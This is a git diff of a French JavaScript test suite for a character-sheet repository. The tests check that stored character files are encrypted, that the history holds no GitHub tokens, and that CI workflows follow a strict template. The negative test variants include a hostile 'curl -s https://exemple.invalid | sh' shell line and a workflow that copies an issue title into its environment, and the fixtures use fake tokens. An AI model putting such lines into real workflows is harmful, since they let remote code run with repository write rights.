@@ -17,6 +17,7 @@ import { createHash } from "node:crypto";
 import { tmpdir } from "node:os";
 import { delimiter, join } from "node:path";
 import { fileURLToPath } from "node:url";
+import { CHEMIN_INDEX, FICHIER, ecrireFichier, ecrireIndex, lireFichier, lireIndex, versionDe } from "../js/personnage/en_ligne.js";
 import { CLASSEUR_ESSAI } from "./outils/classeur_essai.js";
 import { fabriquerClasseur } from "./outils/fabrique_classeur.js";
 
@@ -82,9 +83,18 @@ const JSON_PERMIS = ["package.json", "essais/banque_demo.chiffree.json", "donnee
 // (lot 2 bis, § 7.1).
 const JSON_DE_L_HISTORIQUE = ["essais/banque_format1.chiffree.json"];
 
+// Les personnages en ligne (§ 15.8) : les fichiers que range l'automate et
+// leur index, sous ces seules formes. Le même prédicat sert à l'historique.
+const personnagePermis = (chemin) => FICHIER.test(chemin) || chemin === CHEMIN_INDEX;
+
 function fichiersHorsListe(chemins, { historique = false } = {}) {
   const permis = historique ? [...JSON_PERMIS, ...JSON_DE_L_HISTORIQUE] : JSON_PERMIS;
-  return chemins.filter((chemin) => FORMATS_INTERDITS.test(chemin) || (/\.json$/i.test(chemin) && !permis.includes(chemin)));
+  return chemins.filter((chemin) => FORMATS_INTERDITS.test(chemin) || (/\.json$/i.test(chemin) && !permis.includes(chemin) && !personnagePermis(chemin)));
+}
+
+// personnages/, quelle que soit la casse, ne contient rien d'autre.
+function personnagesHorsForme(chemins) {
+  return chemins.filter((chemin) => chemin.toLowerCase().startsWith("personnages/") && !personnagePermis(chemin));
 }
 
 // § 10.1 : GitHub Pages sert chaque fichier du dépôt dans l'origine de
@@ -171,6 +181,42 @@ function donneesEnClair(chemins, lireTexte) {
   return fautes;
 }
 
+// Interdit 2, pour les personnages en ligne (§ 15.8) : chaque fichier se lit
+// par le vérificateur de la page, sous l'identifiant de son chemin, et son
+// contenu ne se lit pas comme du texte ; l'index dit exactement les
+// fichiers présents, avec leur version. Les formats n'ont que des champs
+// comptés, des identifiants, des dates et du base64 : aucun nom n'y tient
+// en clair.
+function defautsDesPersonnages(chemins, lireTexte) {
+  const fautes = personnagesHorsForme(chemins).map((chemin) => `${chemin} : ni un fichier rangé ni l'index`);
+  const presents = new Set();
+  const lus = new Map();
+  for (const chemin of chemins) {
+    const trouve = FICHIER.exec(chemin);
+    if (!trouve) continue;
+    presents.add(trouve[1]);
+    const lu = lireFichier(lireTexte(chemin), { identifiant: trouve[1] });
+    if (lu.erreur) fautes.push(`${chemin} : ${lu.erreur}`);
+    else if (seLitCommeDuTexte(Buffer.from(lu.fichier.contenu, "base64"))) fautes.push(`${chemin} : contenu en clair, seulement encodé en base64`);
+    else lus.set(trouve[1], lu.fichier);
+  }
+  if (!chemins.includes(CHEMIN_INDEX)) {
+    if (presents.size) fautes.push(`${CHEMIN_INDEX} manque`);
+    return fautes;
+  }
+  const lu = lireIndex(lireTexte(CHEMIN_INDEX));
+  if (lu.erreur) return [...fautes, `${CHEMIN_INDEX} : ${lu.erreur}`];
+  const entrees = new Map(lu.index.personnages.map((entree) => [entree.identifiant, entree]));
+  for (const identifiant of presents) {
+    const entree = entrees.get(identifiant);
+    const fichier = lus.get(identifiant);
+    if (!entree) fautes.push(`${CHEMIN_INDEX} : ${identifiant} n'y est pas`);
+    else if (fichier && (entree.version !== versionDe(fichier) || entree.range_le !== fichier.range_le)) fautes.push(`${CHEMIN_INDEX} : ${identifiant} n'a pas la version de son fichier`);
+  }
+  for (const identifiant of entrees.keys()) if (!presents.has(identifiant)) fautes.push(`${CHEMIN_INDEX} : ${identifiant} n'a pas de fichier`);
+  return fautes;
+}
+
 // Interdit 3 : aucun jeton GitHub entier. Un préfixe seul ne suffit pas, car
 // la spécification les cite (§ 11). La faute donne le fichier et la ligne,
 // jamais le jeton, que le journal de GitHub Actions rendrait public.
@@ -190,16 +236,35 @@ function cheminsDeLHistorique(dossier = RACINE) {
   return [...new Set(gitDans(dossier, "log", "--all", "--name-only", "--format=").split("\n").filter(Boolean))];
 }
 
-// Les révisions où un fichier porte un jeton entier : « sha:chemin »,
-// jamais le jeton, que le journal de GitHub Actions rendrait public.
+// Les contenus de l'historique qui portent un jeton entier : « blob:chemin »,
+// jamais le jeton, que le journal de GitHub Actions rendrait public. Chaque
+// contenu (blob) atteint depuis une référence est lu une seule fois, quel
+// que soit le nombre de révisions qui le portent : l'automate ajoute un
+// commit par ticket rangé, et passer les révisions en arguments dépasserait
+// la ligne de commande de Windows (32 767 signes, quelque 790 révisions),
+// puis relirait l'arbre entier de chacune. Les contenus se lisent en un seul
+// appel, en mémoire (3,6 Mo au 30/09/2026). Comme dans l'arbre
+// (jetonsEntiers), les octets nuls d'un texte UTF-16 sont ôtés.
 function jetonsDansLHistorique(dossier = RACINE) {
-  const revisions = gitDans(dossier, "rev-list", "--all").split("\n").filter(Boolean);
-  try {
-    return gitDans(dossier, "grep", "-l", "--text", "-E", "(gh[pousr]_|github_pat_)[A-Za-z0-9_]{36,}", ...revisions).split("\n").filter(Boolean);
-  } catch (erreur) {
-    if (erreur.status === 1) return [];
-    throw erreur;
+  // Les blobs, chacun avec un chemin où il paraît ; les commits, sans chemin, sont laissés.
+  const chemins = new Map();
+  for (const ligne of gitDans(dossier, "rev-list", "--all", "--objects", "--filter=object:type=blob").split("\n")) {
+    const espace = ligne.indexOf(" ");
+    if (espace > 0) chemins.set(ligne.slice(0, espace), ligne.slice(espace + 1));
   }
+  if (chemins.size === 0) return [];
+  // « sha type taille », puis le contenu et une fin de ligne, pour chacun.
+  const sortie = execFileSync("git", ["cat-file", "--batch"], { cwd: dossier, env: ENVIRONNEMENT, input: `${[...chemins.keys()].join("\n")}\n`, maxBuffer: Infinity, stdio: ["pipe", "pipe", "pipe"] });
+  const fautes = [];
+  for (let position = 0; position < sortie.length; ) {
+    const finDEnTete = sortie.indexOf(0x0a, position);
+    const [sha, type, taille] = sortie.toString("latin1", position, finDEnTete).split(" ");
+    if (type !== "blob") throw new Error(`git cat-file : ${sha} n'est pas un contenu lisible`);
+    const debut = finDEnTete + 1;
+    if (JETON.test(sortie.toString("latin1", debut, debut + Number(taille)).replaceAll("\0", ""))) fautes.push(`${sha}:${chemins.get(sha)}`);
+    position = debut + Number(taille) + 1;
+  }
+  return fautes;
 }
 
 // Tout ce qu'un chemin seul suffit à interdire, pour l'historique.
@@ -211,21 +276,117 @@ function cheminsInterdits(chemins) {
     ...fichiersHorsListe(chemins, { historique: true }),
     ...pagesEnTrop(chemins),
     ...chemins.filter((chemin) => chemin.toLowerCase().startsWith("donnees/") && chemin !== BANQUE),
+    ...personnagesHorsForme(chemins),
   ];
 }
 
-// § 10.2 : le workflow n'emploie que des actions fixées sur un commit, avec
-// les droits les plus faibles, sans jeton gardé ni texte venu d'un tiers.
-function defautsDuWorkflow(texte) {
+// § 10.2 : deux workflows, et eux seuls. « Contrôles » lance node --test ;
+// « Personnages » lance l'automate des personnages en ligne (§ 15.8).
+const WORKFLOWS = { controles: ".github/workflows/controles.yml", personnages: ".github/workflows/personnages.yml" };
+
+function workflowsInconnus(chemins) {
+  return chemins.filter((chemin) => chemin.toLowerCase().startsWith(".github/workflows/") && !Object.values(WORKFLOWS).includes(chemin));
+}
+
+// Les actions d'un workflow : « propriétaire/nom@commit ».
+function actionsDe(texte) {
+  return [...texte.matchAll(/^\s*(?:-\s*)?uses:\s*(\S+)/gm)].map(([, action]) => action);
+}
+
+// Ce que tout workflow respecte : des actions fixées sur un commit, avec leur
+// version ; contents: read au niveau du workflow ; aucun jeton gardé ; aucun
+// texte venu d'un tiers.
+function defautsCommuns(texte) {
   const fautes = [];
   for (const [, action, suite] of texte.matchAll(/^\s*(?:-\s*)?uses:\s*(\S+)(.*)$/gm)) {
     if (!/^[\w.-]+\/[\w.-]+@[0-9a-f]{40}$/.test(action) || !/^\s+#\s*v\d/.test(suite)) fautes.push(`action non fixée : ${action}`);
   }
-  if (!/^permissions:[ ]*\n[ ]+contents:[ ]*read[ ]*$/m.test(texte)) fautes.push("permissions : contents: read attendu au niveau du workflow");
-  if (/:\s*write\b/.test(texte)) fautes.push("une permission en écriture");
+  if (!/^permissions:[ ]*\r?\n[ ]+contents:[ ]*read[ ]*\r?$/m.test(texte)) fautes.push("permissions : contents: read attendu au niveau du workflow");
   if (!/persist-credentials:\s*false/.test(texte)) fautes.push("persist-credentials: false attendu");
   if (/pull_request_target|workflow_run/.test(texte)) fautes.push("déclencheur qui donne des droits à un tiers");
   if (/\$\{\{\s*github\.event/.test(texte)) fautes.push("texte d'un événement recopié dans le workflow");
+  return fautes;
+}
+
+// « Contrôles » : les règles communes, et aucune écriture.
+function defautsDuWorkflow(texte) {
+  const fautes = defautsCommuns(texte);
+  if (/:\s*write\b/.test(texte)) fautes.push("une permission en écriture");
+  return fautes;
+}
+
+// Les lignes utiles d'un YAML (ni vides ni commentaires, sans commentaire
+// de fin), puis les blocs d'une clé : les lignes plus indentées qui la suivent.
+function lignesUtiles(texte) {
+  return texte
+    .split(/\r?\n/)
+    .filter((ligne) => ligne.trim() !== "" && !/^\s*#/.test(ligne))
+    .map((ligne) => ligne.replace(/\s+#.*$/, "").trimEnd());
+}
+
+const LANCER_L_AUTOMATE = "node outils/automate_personnages.js";
+
+// « Personnages » : les règles communes, et son texte exact, ligne utile par
+// ligne utile (ni les lignes vides ni les commentaires ne comptent). Une
+// liste de règles laissait passer ce qu'elle ne nommait pas : un
+// interpréteur (shell:), NODE_OPTIONS, un conteneur, une autre machine, un
+// second checkout qui garde le jeton… Le texte exact ne laisse rien passer.
+// Ouverture d'un ticket ou lancement à la main ; contents: read au
+// workflow ; un passage à la fois, jamais interrompu ; un seul job, qui seul
+// écrit (contents, issues, pages) ; les actions de « Contrôles », sur les
+// mêmes commits ; une seule commande, l'automate ; le jeton pour seule
+// expression. Aucune ligne n'a de guillemet ni d'indicateur de bloc (| >) :
+// un commentaire ne peut s'y cacher dans une valeur.
+function gabaritDeLAutomate(checkout, setupNode) {
+  return [
+    "name: Personnages",
+    "on:",
+    "  issues:",
+    "    types: [opened]",
+    "  workflow_dispatch:",
+    "permissions:",
+    "  contents: read",
+    "concurrency:",
+    "  group: personnages",
+    "  cancel-in-progress: false",
+    "jobs:",
+    "  ranger:",
+    "    name: Ranger les personnages",
+    "    runs-on: ubuntu-latest",
+    "    timeout-minutes: 5",
+    "    permissions:",
+    "      contents: write",
+    "      issues: write",
+    "      pages: write",
+    "    steps:",
+    "      - name: Récupérer le dépôt",
+    `        uses: ${checkout}`,
+    "        with:",
+    "          persist-credentials: false",
+    "      - name: Installer Node 24",
+    `        uses: ${setupNode}`,
+    "        with:",
+    "          node-version: 24",
+    "      - name: Ranger les tickets ouverts",
+    `        run: ${LANCER_L_AUTOMATE}`,
+    "        env:",
+    "          JETON: ${{ github.token }}",
+  ];
+}
+
+// La faute donne le numéro de la ligne utile et ce qui était attendu, jamais
+// la ligne trouvée : le journal de GitHub Actions est public.
+function defautsDeLAutomate(texte, controles) {
+  const fautes = defautsCommuns(texte);
+  const actions = actionsDe(controles);
+  const checkout = actions.find((action) => action.startsWith("actions/checkout@"));
+  const setupNode = actions.find((action) => action.startsWith("actions/setup-node@"));
+  if (!checkout || !setupNode) return [...fautes, "« Contrôles » n'emploie pas actions/checkout et actions/setup-node"];
+  const attendu = gabaritDeLAutomate(checkout, setupNode);
+  const lignes = lignesUtiles(texte);
+  const ecart = attendu.findIndex((ligne, i) => lignes[i] !== ligne);
+  if (ecart !== -1) fautes.push(`ligne utile ${ecart + 1} : « ${attendu[ecart].trim()} » attendu`);
+  else if (lignes.length > attendu.length) fautes.push(`${lignes.length - attendu.length} ligne(s) utile(s) de trop après la ${attendu.length}ᵉ`);
   return fautes;
 }
 
@@ -302,10 +463,13 @@ test(".gitignore — ignore les classeurs, documents et données en clair, pas l
     "donnees/banque.json", "donnees/sous/clair.json", "banque.json", "essais/banque_claire.json", "tests/banque.json",
     "plans/instruction.md", "ressources/notes.md", "desktop.ini", "Thumbs.db", "~$regles_jdr.xlsx", "essais/~$classeur_essai.xlsx",
     "Aubépine.arpenteur.json", "essais/Mon personnage.arpenteur.json", "essais/personnage_demo.json",
+    "personnages/clair.json", "personnages/sous/Qx7-aZ_09bcdEFGHijklmn.chiffre.json", "personnages/sous/index.json", "index.json",
+    "personnages/notes.txt", "personnages/sous/notes.txt", "personnages/Qx7-aZ_09bcdEFGHijklmn.chiffre.js",
   ];
   const suivis = [
     "essais/classeur_essai.xlsx", "essais/banque_demo.chiffree.json", "donnees/banque.chiffree.json", "package.json", "index.html", "js/application.js", "icones/icone.svg",
     "essais/personnage_demo.arpenteur.json", "polices/Marcellus-Regular.woff2", "polices/OFL-Marcellus.txt", "css/fiche.css",
+    "personnages/Qx7-aZ_09bcdEFGHijklmn.chiffre.json", "personnages/index.json",
   ];
   let sortie = "";
   try {
@@ -337,12 +501,40 @@ test("historique — repère un classeur ou un jeton ajouté puis retiré", () =
     g("init", "-q");
     writeFileSync(join(essai, "regles_jdr.xlsx"), "un faux classeur");
     writeFileSync(join(essai, "note.txt"), `jeton : ${"ghp_" + "A1b2".repeat(9)}`);
+    // En UTF-16, comme dans l'arbre (jetonsEntiers) : les octets nuls ôtés.
+    writeFileSync(join(essai, "note16.txt"), Buffer.from(`﻿jeton : ${"ghp_" + "C3d4".repeat(9)}\r\n`, "utf16le"));
     writeFileSync(join(essai, "propre.txt"), "rien");
     g("add", "-A");
     g("commit", "-q", "-m", "ajout");
-    g("rm", "-q", "regles_jdr.xlsx", "note.txt");
+    g("rm", "-q", "regles_jdr.xlsx", "note.txt", "note16.txt");
     g("commit", "-q", "-m", "retrait");
     assert.deepEqual(cheminsInterdits(cheminsDeLHistorique(essai)), ["regles_jdr.xlsx"]);
+    const trouves = jetonsDansLHistorique(essai).sort();
+    assert.equal(trouves.length, 2);
+    assert.match(trouves[0], /^[0-9a-f]{40}:note\.txt$/);
+    assert.match(trouves[1], /^[0-9a-f]{40}:note16\.txt$/);
+  } finally {
+    rmSync(essai, { recursive: true, force: true });
+  }
+});
+
+test("historique — un historique de 900 révisions se lit en entier (la ligne de commande de Windows en passerait quelque 790)", () => {
+  const essai = mkdtempSync(join(tmpdir(), "atelier-historique-long-"));
+  try {
+    gitDans(essai, "init", "-q", "--initial-branch=main");
+    // 900 commits d'un seul coup (git fast-import) : un jeton ajouté au
+    // premier, retiré au second ; l'automate en ajoute un par ticket rangé.
+    const donnee = (texte) => `data ${Buffer.byteLength(texte)}\n${texte}\n`;
+    let flux = "";
+    for (let n = 1; n <= 900; n++) {
+      flux += `commit refs/heads/main\ncommitter Essai <essai@users.noreply.github.com> ${1790000000 + n} +0000\n${donnee(`commit ${n}`)}`;
+      flux += `M 100644 inline compteur.txt\n${donnee(`${n}\n`)}`;
+      if (n === 1) flux += `M 100644 inline note.txt\n${donnee(`jeton : ${"ghp_" + "A1b2".repeat(9)}\n`)}`;
+      if (n === 2) flux += "D note.txt\n";
+      flux += "\n";
+    }
+    execFileSync("git", ["fast-import", "--quiet"], { cwd: essai, env: ENVIRONNEMENT, input: flux, stdio: ["pipe", "pipe", "pipe"] });
+    assert.equal(gitDans(essai, "rev-list", "--count", "--all").trim(), "900");
     const trouves = jetonsDansLHistorique(essai);
     assert.equal(trouves.length, 1);
     assert.match(trouves[0], /^[0-9a-f]{40}:note\.txt$/);
@@ -377,10 +569,115 @@ test("workflow — repère une action non fixée, des droits en écriture, un d�
   }
 });
 
-test("workflow — les workflows du dépôt sont sûrs (§ 10.2)", () => {
-  const workflows = cheminsDuDepot().filter((chemin) => chemin.startsWith(".github/workflows/"));
-  assert.ok(workflows.length >= 1);
-  for (const chemin of workflows) assert.deepEqual(defautsDuWorkflow(lire(chemin, "utf8")), [], chemin);
+test("workflow — repère, dans l'automate des personnages, un déclencheur, un droit, une action, une commande ou une expression de trop", () => {
+  const controles = readFileSync(join(RACINE, WORKFLOWS.controles), "utf8");
+  const vrai = readFileSync(join(RACINE, WORKFLOWS.personnages), "utf8").replace(/\r\n/g, "\n");
+  assert.deepEqual(defautsDeLAutomate(vrai, controles), []);
+  // Les règles de « Contrôles » refusent ses écritures : chacun les siennes.
+  assert.notDeepEqual(defautsDuWorkflow(vrai), []);
+  assert.notDeepEqual(defautsDeLAutomate(controles, controles), []);
+  const variantes = {
+    "déclencheur en plus": vrai.replace("  workflow_dispatch:\n", "  workflow_dispatch:\n  push:\n"),
+    "type en plus": vrai.replace("types: [opened]", "types: [opened, edited]"),
+    "tiers": vrai.replace("  workflow_dispatch:\n", "  workflow_dispatch:\n  workflow_run:\n    workflows: [Contrôles]\n"),
+    "écriture au workflow": vrai.replace("permissions:\n  contents: read", "permissions:\n  contents: write"),
+    "sans permissions au workflow": vrai.replace("permissions:\n  contents: read\n", ""),
+    "écriture en plus au job": vrai.replace("      pages: write\n", "      pages: write\n      actions: write\n"),
+    "tout en écriture": vrai.replace(/    permissions:\n(?:      \w+: write\n)+/, "    permissions: write-all\n"),
+    "sans permissions au job": vrai.replace(/    permissions:\n(?:      \w+: write\n)+/, ""),
+    "action non fixée": vrai.replace(/actions\/checkout@[0-9a-f]{40}/, "actions/checkout@v7"),
+    "action d'un autre commit": vrai.replace(/actions\/checkout@[0-9a-f]{40}/, `actions/checkout@${"0".repeat(40)}`),
+    "action en plus": vrai.replace("      - name: Ranger", `      - uses: tiers/action@${"1".repeat(40)} # v1\n      - name: Ranger`),
+    "sans version": vrai.replace("# v7.0.1", ""),
+    "jeton gardé": vrai.replace("persist-credentials: false", "persist-credentials: true"),
+    "injection": vrai.replace("          JETON: ${{ github.token }}", "          JETON: ${{ github.token }}\n          TITRE: ${{ github.event.issue.title }}"),
+    "autre secret": vrai.replace("${{ github.token }}", "${{ secrets.AUTRE }}"),
+    "commande en plus": vrai.replace("      - name: Ranger", "      - run: npm install\n      - name: Ranger"),
+    "commande changée": vrai.replace(`run: ${LANCER_L_AUTOMATE}`, `run: ${LANCER_L_AUTOMATE} && echo fini`),
+    "annulation": vrai.replace("cancel-in-progress: false", "cancel-in-progress: true"),
+    "autre groupe": vrai.replace("group: personnages", "group: autre"),
+    "sans concurrence": vrai.replace(/concurrency:\n  group: personnages\n  cancel-in-progress: false\n/, ""),
+    "second job": `${vrai}  autre:\n    runs-on: ubuntu-latest\n    steps:\n      - run: node outils/automate_personnages.js\n`,
+    // Ce qu'une liste de règles laissait passer : du code arbitraire, un
+    // autre lieu d'exécution, un jeton gardé par un second checkout.
+    "interpréteur": vrai.replace("        run: node outils", "        shell: bash -c 'curl -s https://exemple.invalid | sh; node {0}'\n        run: node outils"),
+    "NODE_OPTIONS": vrai.replace("          JETON: ${{ github.token }}", "          JETON: ${{ github.token }}\n          NODE_OPTIONS: --import=./x.mjs"),
+    "conteneur": vrai.replace("    runs-on: ubuntu-latest", "    runs-on: ubuntu-latest\n    container: node:24"),
+    "machine de l'auteur": vrai.replace("runs-on: ubuntu-latest", "runs-on: self-hosted"),
+    "autre dossier": vrai.replace("        run: node outils", "        working-directory: autre\n        run: node outils"),
+    "autre branche": vrai.replace("          persist-credentials: false", "          persist-credentials: false\n          ref: autre"),
+    "second checkout": vrai.replace("      - name: Installer Node 24", `      - uses: ${actionsDe(controles)[0]} # v7.0.1\n      - name: Installer Node 24`),
+    "interpréteur par défaut": vrai.replace("jobs:\n", "defaults:\n  run:\n    shell: bash\njobs:\n"),
+    "condition": vrai.replace("        run: node outils", "        if: false\n        run: node outils"),
+    "échec caché": vrai.replace("        run: node outils", "        continue-on-error: true\n        run: node outils"),
+    "délai long": vrai.replace("timeout-minutes: 5", "timeout-minutes: 360"),
+  };
+  for (const [cas, variante] of Object.entries(variantes)) assert.notEqual(variante, vrai, `${cas} : la variante n'a rien changé`);
+  const admises = Object.entries(variantes).filter(([, variante]) => defautsDeLAutomate(variante, controles).length === 0).map(([cas]) => cas);
+  assert.deepEqual(admises, [], "variantes fautives admises");
+});
+
+test("workflow — repère un workflow inconnu", () => {
+  const chemins = [WORKFLOWS.controles, WORKFLOWS.personnages, ".github/workflows/autre.yml", ".github/workflows/Controles.yml", ".GitHub/Workflows/x.yaml", ".github/dependabot.yml"];
+  assert.deepEqual(workflowsInconnus(chemins), chemins.slice(2, 5));
+});
+
+test("workflow — les workflows du dépôt sont sûrs, et ce sont les seuls (§ 10.2)", () => {
+  const workflows = cheminsDuDepot().filter((chemin) => chemin.toLowerCase().startsWith(".github/workflows/"));
+  assert.deepEqual(workflowsInconnus(workflows), []);
+  assert.deepEqual([...workflows].sort(), Object.values(WORKFLOWS).sort());
+  const controles = lire(WORKFLOWS.controles, "utf8");
+  assert.deepEqual(defautsDuWorkflow(controles), [], WORKFLOWS.controles);
+  assert.deepEqual(defautsDeLAutomate(lire(WORKFLOWS.personnages, "utf8"), controles), [], WORKFLOWS.personnages);
+});
+
+// Un fichier rangé d'essai : des octets qui ne se lisent pas comme du texte,
+// comme un vrai chiffré (§ 15.8).
+function fichierDEssai(identifiant, octetIv = 9) {
+  return {
+    format: 1, identifiant, depose_le: "2026-09-30T10:21:36.536Z", range_le: "2026-09-30T10:22:05Z", ticket: 12,
+    sel: Buffer.alloc(16, 7).toString("base64"), iv: Buffer.alloc(12, octetIv).toString("base64"), contenu: Buffer.alloc(48, 0x9c).toString("base64"),
+  };
+}
+
+test("personnages — repère un chemin hors forme, un fichier illisible ou en clair, un index qui ne dit pas les fichiers", () => {
+  const [A, B, C] = ["Qx7-aZ_09bcdEFGHijklmn", "AAAAAAAAAAAAAAAAAAAAAA", "BBBBBBBBBBBBBBBBBBBBBB"];
+  const [fa, fb] = [fichierDEssai(A), fichierDEssai(B, 5)];
+  const chemin = (id) => `personnages/${id}.chiffre.json`;
+  const bon = { [chemin(A)]: ecrireFichier(fa), [chemin(B)]: ecrireFichier(fb), [CHEMIN_INDEX]: ecrireIndex([fa, fb]) };
+  const defauts = (arbre) => defautsDesPersonnages(Object.keys(arbre), (c) => arbre[c]);
+  assert.deepEqual(defauts(bon), []);
+  assert.deepEqual(defauts({}), []);
+  assert.deepEqual(defauts({ [CHEMIN_INDEX]: ecrireIndex([]) }), []);
+  // Un contenu en clair, seulement encodé : le vérificateur de la page l'admet, pas ce contrôle.
+  const clair = { ...fa, contenu: Buffer.from(JSON.stringify({ nom: "Aubépine Crèmebrûlée" })).toString("base64") };
+  const { [CHEMIN_INDEX]: _index, ...sansIndex } = bon;
+  const cas = {
+    "chemin hors forme": { ...bon, "personnages/notes.txt": "x" },
+    "sous-dossier": { ...bon, [`personnages/sous/${A}.chiffre.json`]: bon[chemin(A)] },
+    "nom dans le chemin": { ...bon, "personnages/Aubépine.chiffre.json": bon[chemin(A)] },
+    "casse du dossier": { ...bon, [`Personnages/${C}.chiffre.json`]: ecrireFichier(fichierDEssai(C)) },
+    "champ en plus": { ...bon, [chemin(A)]: JSON.stringify({ ...fa, nom: "Aubépine" }, null, 2) },
+    "identifiant d'un autre chemin": { ...bon, [chemin(A)]: bon[chemin(B)] },
+    "contenu en clair": { ...bon, [chemin(A)]: ecrireFichier(clair) },
+    "index absent": sansIndex,
+    "index en retard": { ...bon, [CHEMIN_INDEX]: ecrireIndex([fa]) },
+    "index en trop": { ...bon, [CHEMIN_INDEX]: ecrireIndex([fa, fb, fichierDEssai(C)]) },
+    "version fausse": { ...bon, [CHEMIN_INDEX]: ecrireIndex([fa, fichierDEssai(B, 6)]) },
+    "date fausse": { ...bon, [CHEMIN_INDEX]: ecrireIndex([fa, { ...fb, range_le: "2026-09-30T11:00:00Z" }]) },
+    "index avec un nom": { ...bon, [CHEMIN_INDEX]: bon[CHEMIN_INDEX].replace('"version"', '"nom": "Aubépine",\n      "version"') },
+    "index illisible": { ...bon, [CHEMIN_INDEX]: "{" },
+  };
+  for (const [nom, arbre] of Object.entries(cas)) assert.notDeepEqual(defauts(arbre), [], nom);
+  // Les mêmes formes, dans l'arbre comme dans l'historique.
+  const chemins = [chemin(A), CHEMIN_INDEX, "personnages/clair.json", "personnages/notes.txt", `personnages/sous/${A}.chiffre.json`, "personnages/court.chiffre.json"];
+  assert.deepEqual(fichiersHorsListe(chemins), ["personnages/clair.json", `personnages/sous/${A}.chiffre.json`, "personnages/court.chiffre.json"]);
+  assert.deepEqual(personnagesHorsForme(chemins), chemins.slice(2));
+  assert.deepEqual([...new Set(cheminsInterdits(chemins))].sort(), chemins.slice(2).sort());
+});
+
+test("personnages — les fichiers de personnages/ sont rangés, chiffrés, et l'index les dit tous", () => {
+  assert.deepEqual(defautsDesPersonnages(cheminsDuDepot(), (chemin) => lire(chemin, "utf8")), []);
 });
 
 // Le crochet pre-push (§ 10.3) : les contrôles passent avant chaque envoi.
